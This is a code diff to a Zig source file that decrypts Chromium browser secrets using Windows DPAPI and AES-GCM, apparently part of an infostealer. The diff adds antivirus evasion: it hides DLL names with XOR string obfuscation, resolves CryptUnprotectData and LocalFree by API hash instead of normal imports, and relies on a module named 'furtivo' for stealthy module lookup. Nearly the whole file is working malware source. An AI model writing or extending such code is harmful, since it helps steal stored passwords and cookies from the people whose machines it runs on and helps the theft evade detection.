@@ -1,24 +1,44 @@
 const std = @import("std");
+const furtivo = @import("furtivo.zig");
+const obf = @import("obf.zig");
 
 const DATA_BLOB = extern struct {
     cbData: u32,
     pbData: [*]u8,
 };
 
-extern "crypt32" fn CryptUnprotectData(
-    pDataIn: *const DATA_BLOB,
-    ppszDataDescr: ?*?[*]u16,
-    pOptionalEntropy: ?*const DATA_BLOB,
-    pvReserved: ?*anyopaque,
-    pPromptStruct: ?*anyopaque,
-    dwFlags: u32,
-    pDataOut: *DATA_BLOB,
-) callconv(.C) c_int;
+const CryptUnprotectDataFn = *const fn (
+    *const DATA_BLOB, // pDataIn
+    ?*?[*]u16, // ppszDataDescr
+    ?*const DATA_BLOB, // pOptionalEntropy
+    ?*anyopaque, // pvReserved
+    ?*anyopaque, // pPromptStruct
+    u32, // dwFlags
+    *DATA_BLOB, // pDataOut
+) callconv(.winapi) c_int;
 
-extern "kernel32" fn LocalFree(hMem: [*]u8) callconv(.C) ?*anyopaque;
+const LocalFreeFn = *const fn ([*]u8) callconv(.winapi) ?*anyopaque;
 
 pub fn unprotectData(allocator: std.mem.Allocator, encrypted_data: []const u8) ![]u8 {
     if (encrypted_data.len == 0) return error.EmptyData;
+
+    // Resolve crypt32.dll dynamically
+    const crypt32_name = obf.xorStr("crypt32.dll");
+    const crypt32 = furtivo.getModuleHandle(&crypt32_name);
+    if (crypt32 == 0) return error.Crypt32NotFound;
+
+    const crypt_unprotect_addr = obf.getProcAddressByHash(crypt32, comptime obf.apiHash("CryptUnprotectData")) catch 0;
+    if (crypt_unprotect_addr == 0) return error.CryptUnprotectDataNotFound;
+    const CryptUnprotectData = @as(CryptUnprotectDataFn, @ptrFromInt(crypt_unprotect_addr));
+
+    // Resolve LocalFree from kernel32.dll dynamically
+    const k32_name = obf.xorStr("kernel32.dll");
+    const k32 = furtivo.getModuleHandle(&k32_name);
+    if (k32 == 0) return error.Kernel32NotFound;
+
+    const local_free_addr = obf.getProcAddressByHash(k32, comptime obf.apiHash("LocalFree")) catch 0;
+    if (local_free_addr == 0) return error.LocalFreeNotFound;
+    const LocalFree = @as(LocalFreeFn, @ptrFromInt(local_free_addr));
 
     const data_in = DATA_BLOB{
         .cbData = @intCast(encrypted_data.len),
@@ -44,17 +64,16 @@ pub fn unprotectData(allocator: std.mem.Allocator, encrypted_data: []const u8) !
 pub fn decryptAESGCM(allocator: std.mem.Allocator, key: []const u8, iv: []const u8, ciphertext: []const u8) ![]u8 {
     if (key.len != 32) return error.InvalidKeySize;
 
-    var plaintext = try allocator.alloc(u8, ciphertext.len);
-    errdefer allocator.free(plaintext);
-
-    // Using Zig's standard library for AES-GCM
-    const cipher = std.crypto.aead.aes_gcm.Aes256Gcm;
-    
     // In Chromium, the payload has the tag appended at the end (last 16 bytes)
     if (ciphertext.len < 16) return error.CiphertextTooShort;
     const actual_ciphertext = ciphertext[0..ciphertext.len - 16];
     const tag = ciphertext[ciphertext.len - 16..][0..16];
 
-    try cipher.decrypt(plaintext[0..actual_ciphertext.len], actual_ciphertext, tag.*, "", iv, key);
-    return plaintext[0..actual_ciphertext.len];
+    const plaintext = try allocator.alloc(u8, actual_ciphertext.len);
+    errdefer allocator.free(plaintext);
+
+    // Using Zig's standard library for AES-GCM
+    const cipher = std.crypto.aead.aes_gcm.Aes256Gcm;
+    try cipher.decrypt(plaintext, actual_ciphertext, tag.*, "", iv[0..12].*, key[0..32].*);
+    return plaintext;
 }
